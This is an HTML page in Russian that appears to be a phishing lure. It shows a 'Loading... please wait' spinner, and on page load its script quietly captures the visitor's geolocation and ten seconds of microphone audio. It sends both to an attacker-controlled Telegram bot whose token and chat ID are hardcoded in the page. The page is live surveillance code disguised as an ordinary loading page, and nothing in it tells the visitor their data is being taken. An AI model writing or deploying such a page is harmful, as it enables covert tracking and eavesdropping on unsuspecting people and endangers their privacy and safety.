<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ссылка загружается</title>
    <style>
        body {
            background-color: #000000; /* Черный */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        .loader {
            border: 10px solid #f3f3f3; /* Светло-серый */
            border-top: 10px solid #ff6200; /* Оранжевый */
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .message {
            color: #ff6200; /* Оранжевый */
            font-size: 24px;
            margin-top: 20px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div>
        <div class="loader"></div>
        <div class="message">Загрузка... Пожалуйста, подождите</div>
    </div>

    <script>
        // Получение местоположения
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, showError);
            } else {
                alert("Ваш браузер не поддерживает геолокацию.");
            }
        }

        function sendLocation(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const locationData = `Местоположение: Широта ${lat}, Долгота ${lon}`;
            sendToTelegram(locationData);
        }

        function showError(error) {
            alert("Ошибка получения местоположения: " + error.message);
        }

        // Запись звука
        let mediaRecorder;
        let audioChunks = [];

        async function startRecording() {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            mediaRecorder = new MediaRecorder(stream);
            mediaRecorder.ondataavailable = (event) => {
                audioChunks.push(event.data);
            };
            mediaRecorder.onstop = () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                sendAudioToTelegram(audioBlob);
                audioChunks = [];
            };
            mediaRecorder.start();
            document.querySelector('.message').innerText = "Идет запись звука...";
        }

        function stopRecording() {
            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                mediaRecorder.stop();
                document.querySelector('.message').innerText = "Запись звука остановлена.";
            }
        }

        // Отправка данных в Telegram
        function sendToTelegram(message) {
            const chatId = '1220575760'; // Твой числовой ID
            const token = '1402368167:AAFDWCnh640v9tcQ5Um-Zg_DPaahthSwVzI'; // Токен бота
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
            fetch(url);
        }

        function sendAudioToTelegram(audioBlob) {
            const chatId = '1220575760';
            const token = '1402368167:AAFDWCnh640v9tcQ5Um-Zg_DPaahthSwVzI';
            const url = `https://api.telegram.org/bot${token}/sendAudio?chat_id=${chatId}`;
            const formData = new FormData();
            formData.append('audio', audioBlob, 'recording.webm');
            fetch(url, { method: 'POST', body: formData });
        }

        // Автоматический запуск при загрузке страницы
        window.onload = () => {
            getLocation();
            startRecording();
            setTimeout(stopRecording, 10000); // Остановить запись через 10 секунд
        };
    </script>
</body>
</html>
